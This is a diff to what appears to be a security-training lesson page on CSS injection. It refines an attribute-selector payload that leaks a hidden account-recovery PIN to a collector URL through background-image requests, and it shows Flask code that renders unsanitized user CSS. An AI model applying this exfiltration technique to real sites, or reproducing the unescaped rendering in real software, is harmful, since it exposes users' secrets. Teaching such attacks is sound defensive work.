@@ -32,12 +32,18 @@
 <p>
   The theme preview below accepts any CSS you submit and injects it
   verbatim. A CSS attribute selector like
-  <code>input[value^="7"]</code> matches any element whose
-  <code>value</code> attribute starts with <code>7</code> -- and pairing
-  that selector with a <code>background-image</code> rule makes the
-  browser issue a real HTTP request the instant it matches:
+  <code>input[value^="7"] + p</code> matches the rendered paragraph
+  immediately following any element whose <code>value</code> attribute
+  starts with <code>7</code> -- and pairing that selector with a
+  <code>background-image</code> rule makes the browser issue a real HTTP
+  request the instant it matches. The selector has to target that
+  <em>sibling</em> rather than the PIN field itself, because the PIN field
+  is a hidden input (<code>display:none</code>) and browsers never fetch
+  <code>background-image</code> for an element that isn't rendered --
+  hopping one element sideways with the <code>+</code> combinator to a
+  rendered neighbor is what actually triggers the request:
 </p>
-<pre>input[name="account_recovery_pin"][value^="7"] {
+<pre>input[name="account_recovery_pin"][value^="7"] + p {
   background-image: url(/a03/css-exfil-collector?leak=7);
 }</pre>
 <p>
@@ -65,8 +71,8 @@
 def theme_preview():
     custom_css = request.form.get("custom_css", "") if request.method == "POST" else ""
     return render_template("theme_preview.html", custom_css=custom_css, ...)
-# template: &lt;style&gt;{{ custom_css|safe }}&lt;/style&gt;  -- |safe disables
-# Jinja's escaping entirely, and no CSS sanitizer runs on custom_css at all
+# template: &lt;style&gt;{% raw %}{{ custom_css|safe }}{% endraw %}&lt;/style&gt;  -- |safe
+# disables Jinja's escaping entirely, and no CSS sanitizer runs on custom_css at all
 {% endblock %}
 
 {% block secure_code %}# Don't render arbitrary user-supplied CSS at all -- offer a fixed set of
